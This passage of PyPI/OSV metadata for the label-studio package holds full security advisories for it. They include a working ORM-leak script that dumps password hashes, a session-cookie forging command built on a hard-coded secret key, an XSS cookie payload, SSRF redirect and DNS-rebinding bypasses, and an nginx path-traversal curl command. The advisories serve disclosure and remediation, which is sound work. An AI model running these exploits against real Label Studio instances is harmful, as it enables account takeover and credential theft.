the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.7.1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.7.1/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","bleach (~=5.0.0)","google-api-core (==2.10.0)","google-auth (==2.11.0)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==2.3.2)","google-cloud-storage (~=2.5.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==2.3.3)","googleapis-common-protos (==1.56.4)","grpc-google-iam-v1 (==0.12.3)","Django (==3.2.16)","django-storages (==1.12.3)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","djangorestframework (==3.13.1)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.1)","pydantic (<=1.8.2,>=1.7.3)","python-dateutil (==2.8.1)","pytz (~=2019.3)","requests (<2.28,>=2.22.0)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=4.2.0)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.5.0)","python-json-logger (==2.0.4)","label-studio-converter (==0.0.48rc0)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.7.1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"fc84bd603ddb3ce51af80f8064a8c19b67598cd1bcbe0ec6b432d5e3f9a95503","md5":"020ac9cef16057d611f07b058cc8fbda","sha256":"00d8042da4d784554ebae06e6f4e53f46a257c7f2f2dabfe7e125febe8f1b5d2"},"downloads":-1,"filename":"label_studio-1.7.1-py3-none-any.whl","has_sig":false,"md5_digest":"020ac9cef16057d611f07b058cc8fbda","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":44576434,"upload_time":"2023-01-27T00:16:34","upload_time_iso_8601":"2023-01-27T00:16:34.133020Z","url":"https://files.pythonhosted.org/packages/fc/84/bd603ddb3ce51af80f8064a8c19b67598cd1bcbe0ec6b432d5e3f9a95503/label_studio-1.7.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"84236041bae7256a421f6ce8f73f90d8fe68e308760c3dfc04f9875be293b028","md5":"63f83de199fc994400134c84e0ba4810","sha256":"571064c0ef4596e5733ffe22373ce36c2f733ff5fb267398c4090d2353bb605e"},"downloads":-1,"filename":"label-studio-1.7.1.tar.gz","has_sig":false,"md5_digest":"63f83de199fc994400134c84e0ba4810","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":43558577,"upload_time":"2023-01-27T00:16:38","upload_time_iso_8601":"2023-01-27T00:16:38.604653Z","url":"https://files.pythonhosted.org/packages/84/23/6041bae7256a421f6ce8f73f90d8fe68e308760c3dfc04f9875be293b028/label-studio-1.7.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = 